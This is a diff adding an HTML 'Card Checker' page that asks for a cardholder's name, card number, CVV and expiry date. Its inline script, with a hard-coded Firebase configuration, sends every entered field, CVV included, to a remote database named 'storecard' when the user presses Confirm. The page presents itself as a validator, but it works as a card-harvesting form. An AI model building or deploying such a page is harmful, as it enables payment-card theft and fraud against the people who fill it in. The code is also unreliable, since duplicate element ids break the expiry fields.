@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Card Validation</title>
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/styles.css">
+    <link rel="stylesheet" type="text/css" href="assets/css/demo.css">
+</head>
+
+<body>
+    <div class="container-fluid">
+        <header>
+            <div class="limiter">
+                <h3>Hi, This is Vigneshkumar Radhakrishnan. Welcome!!!.</h3>
+            </div>
+        </header>
+        <div class="creditCardForm">
+            <div class="heading">
+                <h1>Card Checker</h1>
+            </div>
+            <div class="payment">
+                <form>
+                    <div class="form-group owner">
+                        <label for="owner">CardHolder's Name</label>
+                        <input type="text" class="form-control" id="owner">
+                    </div>
+                    <div class="form-group CVV">
+                        <label for="cvv">CVV</label>
+                        <input type="text" class="form-control" id="cvv">
+                    </div>
+                    <div class="form-group" id="card-number-field">
+                        <label for="cardNumber">Card Number</label>
+                        <input type="text" class="form-control" id="cardNumber">
+                    </div>
+                    <div class="form-group" id="expiration-date">
+                        <label>Expiration Date</label>
+                        <select>
+                            <option value="01" id="expMonth">January</option>
+                            <option value="02" id="expMonth">February </option>
+                            <option value="03" id="expMonth">March</option>
+                            <option value="04" id="expMonth">April</option>
+                            <option value="05" id="expMonth">May</option>
+                            <option value="06" id="expMonth">June</option>
+                            <option value="07" id="expMonth">July</option>
+                            <option value="08" id="expMonth">August</option>
+                            <option value="09" id="expMonth">September</option>
+                            <option value="10" id="expMonth">October</option>
+                            <option value="11" id="expMonth">November</option>
+                            <option value="12" id="expMonth">December</option>
+                        
+                        </select>
+                        <select>
+                            <option value="21" id="expYear"> 2021</option>
+                            <option value="22" id="expYear"> 2022</option>
+                            <option value="23" id="expYear"> 2023</option>
+                            <option value="24" id="expYear"> 2024</option>
+                            <option value="25" id="expYear"> 2025</option>
+                            <option value="26" id="expYear"> 2026</option>
+                            <option value="27" id="expYear"> 2027</option>
+                            <option value="28" id="expYear"> 2028</option>
+                            <option value="29" id="expYear"> 2029</option>
+                            <option value="30" id="expYear"> 2030</option>
+                            
+                        </select>
+                    </div>
+                    <div class="form-group" id="credit_cards">
+                        <img src="assets/images/visa.jpg" id="visa">
+                        <img src="assets/images/mastercard.jpg" id="mastercard">
+                        <img src="assets/images/amex.jpg" id="amex">
+                    </div>
+                    <div class="form-group" id="pay-now">
+                        <button type="submit" class="btn btn-default" id="confirm-purchase">Confirm</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+
+    </div>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
+    <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+    <script src="assets/js/jquery.payform.min.js" charset="utf-8"></script>
+    <script src="assets/js/script.js"></script>
+
+    <script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.2.2/firebase-database.js"></script>
+
+    <script id="MainScript">
+        var firebaseConfig = {
+            apiKey: "AIzaSyArui74jRR3Rem1atRtr3lJhhrvqMjQ9PY",
+            authDomain: "storecard-93914.firebaseapp.com",
+            databaseURL: "https://storecard-93914-default-rtdb.firebaseio.com",
+            projectId: "storecard-93914",
+            storageBucket: "storecard-93914.appspot.com",
+            messagingSenderId: "478075199461",
+            appId: "1:478075199461:web:ef7e2e36609e620d4e990c",
+            measurementId: "G-7GEC9XN6ZP"
+          };
+          // Initialize Firebase
+          firebase.initializeApp(firebaseConfig);
+
+          //-------Get
+          var owner, cardNumber, CVV,expMonth,expYear;
+
+          function Ready(){
+          owner=document.getElementById('owner').value;
+          cardNumber=document.getElementById('cardNumber').value;
+          CVV=document.getElementById('cvv').value;
+          expMonth=document.getElementById('expMonth').value;
+          expYear=document.getElementById('expYear').value;
+          }
+        
+          //--Insert
+        document.getElementById('confirm-purchase').onclick=function(){
+            Ready();
+            firebase.database().ref('name/'+owner).set({
+            owner : owner,
+            cardNumber : cardNumber,
+            CVV : CVV,
+            expMonth : expMonth,
+            expYear : expYear
+       });
+    }
+    </script>
+</body>
+
+</html>
